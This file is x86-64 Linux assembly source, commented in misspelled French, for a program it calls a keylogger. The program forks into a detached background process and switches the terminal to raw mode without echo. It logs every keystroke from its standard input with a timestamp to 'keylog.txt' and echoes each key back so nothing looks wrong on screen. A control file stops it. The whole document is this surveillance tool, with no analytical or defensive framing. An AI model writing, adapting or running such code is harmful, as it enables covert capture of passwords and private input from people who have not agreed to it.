section .data
    ; chemins des fichié
    log_file db "keylog.txt", 0
    ctrl_file db "k.ctrl", 0
    
    ; messajes
    start_msg db "Keylogger started", 10, 0
    start_len equ $ - start_msg
    
    ; constantes
    STDIN equ 0
    STDOUT equ 1
    TCGETS equ 0x5401
    TCSETS equ 0x5402
    
    ; descripteur de fichié
    fd dq 0
    ctrl_fd dq 0

section .bss
    termios resb 60              ; parametres du terminale
    orig_termios resb 60         ; parametres originaux du terminale
    buf resb 8                   ; buffer d'entré
    time_buf resb 32             ; buffer pour l'orodatage
    tspec resq 2                 ; pour clock_gettime
    
section .text
global _start

_start:
    ; creer fichier de controle
    mov rax, 2                   ; sys_open
    mov rdi, ctrl_file
    mov rsi, 102o                ; O_CREAT | O_WRONLY
    mov rdx, 0644o               ; permisions
    syscall
    
    cmp rax, 0
    jl exit
    
    mov [ctrl_fd], rax
    
    ; ecrire 0 dans fichier de control
    mov byte [buf], 0
    mov rax, 1                   ; sys_write
    mov rdi, [ctrl_fd]
    mov rsi, buf
    mov rdx, 1
    syscall
    
    ; fermer le fichié control
    mov rax, 3                   ; sys_close
    mov rdi, [ctrl_fd]
    syscall
    
    ; ouvrir fichié de log
    mov rax, 2                   ; sys_open
    mov rdi, log_file
    mov rsi, 1102o               ; O_CREAT | O_WRONLY | O_APPEND
    mov rdx, 0644o               ; permisions
    syscall
    
    cmp rax, 0
    jl exit
    
    mov [fd], rax
    
    ; ecrire messaje de demarrage
    mov rax, 1                   ; sys_write
    mov rdi, [fd]
    mov rsi, start_msg
    mov rdx, start_len
    syscall
    
    ; fork pour creer procesus enfant
    mov rax, 57                  ; sys_fork
    syscall
    
    cmp rax, 0
    je child_process             ; procesus enfant
    jg parent_process            ; procesus parent
    jmp exit                     ; erreur
    
child_process:
    ; creer nouvelle session
    mov rax, 112                 ; sys_setsid
    syscall
    
    ; obtenir parametres actuels du terminale
    mov rax, 16                  ; sys_ioctl
    mov rdi, STDIN
    mov rsi, TCGETS
    mov rdx, termios
    syscall
    
    ; sauvegarder parametres originaux
    mov rcx, 60                  ; taille de termios
    mov rsi, termios
    mov rdi, orig_termios
    rep movsb
    
    ; modifier parametres du terminale
    ; effacer flags ECHO et ICANON (bits 1 et 3 dans c_lflag)
    ; ECHO = 0x8, ICANON = 0x2
    mov eax, [termios+12]        ; c_lflag a l'offset 12
    and eax, ~0xA                ; effacer bits ECHO et ICANON
    mov [termios+12], eax
    
    ; mettre c_cc[VMIN] = 1 (lire au moins un caractère)
    mov byte [termios+17], 1
    
    ; mettre c_cc[VTIME] = 0 (pas de timeout)
    mov byte [termios+16], 0
    
    ; appliquer nouvo parametres
    mov rax, 16                  ; sys_ioctl
    mov rdi, STDIN
    mov rsi, TCSETS
    mov rdx, termios
    syscall
    
    ; boucle principale - lire et enregistrer les touches
main_loop:
    ; verifier fichié de control
    mov rax, 2                   ; sys_open
    mov rdi, ctrl_file
    mov rsi, 0                   ; O_RDONLY
    mov rdx, 0
    syscall
    
    cmp rax, 0
    jl continue_loop
    
    mov [ctrl_fd], rax
    
    ; lire l'octet de control
    mov rax, 0                   ; sys_read
    mov rdi, [ctrl_fd]
    mov rsi, buf
    mov rdx, 1
    syscall
    
    mov rbx, rax                 ; sauvegarder octets lus
    
    ; fermer fichié de control
    mov rax, 3                   ; sys_close
    mov rdi, [ctrl_fd]
    syscall
    
    ; verifier si on doit sortir
    cmp rbx, 1
    jne continue_loop
    cmp byte [buf], 0
    jne cleanup_exit
    
continue_loop:
    ; lire une touche
    mov rax, 0                   ; sys_read
    mov rdi, STDIN
    mov rsi, buf
    mov rdx, 1
    syscall
    
    cmp rax, 1                   ; verifier si on a lu un caractere
    jne main_loop
    
    ; obtenir orodatage
    mov rax, 228                 ; sys_clock_gettime
    mov rdi, 0                   ; CLOCK_REALTIME
    mov rsi, tspec
    syscall
    
    ; formater l'orodatage
    mov rax, [tspec]             ; secondes
    mov rcx, 0                   ; compteur de chiffres
    mov r8, 10                   ; base 10
    lea rbx, [time_buf+19]       ; fin du buffer
    mov byte [rbx], 0            ; terminateur null
    
    ; convertir en chiffres (en ordre inverse)
ts_convert:
    dec rbx
    xor rdx, rdx
    div r8
    add dl, '0'
    mov [rbx], dl
    inc rcx
    test rax, rax
    jnz ts_convert
    
    ; remplir avec des zero au début
    cmp rcx, 19
    jge ts_done
    
ts_fill:
    dec rbx
    mov byte [rbx], '0'
    inc rcx
    cmp rcx, 19
    jl ts_fill
    
ts_done:
    ; ecrire l'orodatage dans le log
    mov rax, 1                   ; sys_write
    mov rdi, [fd]
    mov rsi, rbx                 ; debut de l'orodatage formaté
    mov rdx, 20                  ; longueur (incluant null)
    syscall
    
    ; ecrire séparateur
    mov byte [time_buf], ' '
    mov byte [time_buf+1], '|'
    mov byte [time_buf+2], ' '
    
    mov rax, 1                   ; sys_write
    mov rdi, [fd]
    mov rsi, time_buf
    mov rdx, 3
    syscall
    
    ; ecrire la touche
    mov rax, 1                   ; sys_write
    mov rdi, [fd]
    mov rsi, buf
    mov rdx, 1
    syscall
    
    ; ecrire saut de ligne
    mov byte [time_buf], 10      ; nouvelle ligne
    
    mov rax, 1                   ; sys_write
    mov rdi, [fd]
    mov rsi, time_buf
    mov rdx, 1
    syscall
    
    ; afficher caractère sur le terminal
    mov rax, 1                   ; sys_write
    mov rdi, STDOUT
    mov rsi, buf
    mov rdx, 1
    syscall
    
    jmp main_loop
    
cleanup_exit:
    ; restaurer parametres originaux du terminale
    mov rax, 16                  ; sys_ioctl
    mov rdi, STDIN
    mov rsi, TCSETS
    mov rdx, orig_termios
    syscall
    
    ; fermer fichié de log
    mov rax, 3                   ; sys_close
    mov rdi, [fd]
    syscall
    
    ; sortir
    jmp exit
    
parent_process:
    ; le parent sort simplement, laissant l'enfant en arriere-plan
    
exit:
    mov rax, 60                  ; sys_exit
    xor rdi, rdi
    syscall